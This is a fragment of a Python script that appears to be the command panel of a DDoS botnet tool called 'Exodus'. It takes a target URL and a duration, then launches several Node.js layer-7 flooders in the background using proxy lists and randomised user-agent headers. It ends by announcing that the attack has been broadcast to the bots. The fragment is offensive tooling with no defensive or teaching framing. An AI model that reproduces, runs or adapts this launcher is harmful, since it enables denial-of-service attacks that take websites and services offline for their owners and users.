    ...
    while True:
        ...
        if sinput == "help" or sinput == "l7":
            ...
            try:
                ...
                os.system(f'cd l7 && screen -dm node lmao.js {url} {time} 20 512 proxy12.txt -h user-agent@"Mozilla %RAND-16%')
                os.system(f'cd l7 && screen -dm node lmao1.js {url} {time} 20 512 proxy11.txt -h user-agent@"Mozilla %RAND-16%')
...
""")
            ...
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l7 && screen -dm node shunga1.js {url} {time} 512 12 proxy1.txt')
                os.system(f'cd l7 && screen -dm node shunga.js {url} {time} 512 12 proxy.txt')
                os.system(f'cd l7 && screen -dm node dildoser1.js {url} {time} 12 512 proxy3.txt 1')
                os.system(f'cd l7 && screen -dm node lmao.js {url} {time} 20 512 proxy12.txt -h user-agent@"Mozilla %RAND-16%')
                os.system(f'cd l7 && screen -dm node lmao1.js {url} {time} 20 512 proxy11.txt -h user-agent@"Mozilla %RAND-16%')
                os.system(f'cd l7 && screen -dm node ddoser1.js {url} {time} 512 12')
                os.system(f'cd l7 && screen -dm node ddoser1.js {url} {time} 512 12')
                print(f"""\033[90m
𝘼𝙩𝙩𝙖𝙘𝙠 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙗𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩𝙚𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙀𝙭𝙤𝙙𝙪𝙨 𝘽𝙤𝙩𝙨!!!\033[0m
""")
            ...
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l7 && screen -dm node ddoser.js {url} {time} 512 12')
                os.system(f'cd l7 && screen -dm node shunga.js {url} {time} 512 12 proxy1.txt')
                os.system(f'cd l7 && screen -dm node dildoser1.js {url} {time} 12 512 proxy.txt 1')
                os.system(f'cd l7 && screen -dm node dildoser.js {url} {time} 12 512 proxy2.txt 1')
                os.system(f'cd l7 && screen -dm node lmao.js {url} {time} 20 512 proxy12.txt -h user-agent@"Mozilla %RAND-16%')
                os.system(f'cd l7 && screen -dm node lmao1.js {url} {time} 20 512 proxy11.txt -h user-agent@"Mozilla %RAND-16%')
                os.system(f'cd l7 && screen -dm node ddoser1.js {url} {time} 512 12')
                os.system(f'cd l7 && screen -dm node ddoser1.js {url} {time} 512 12')
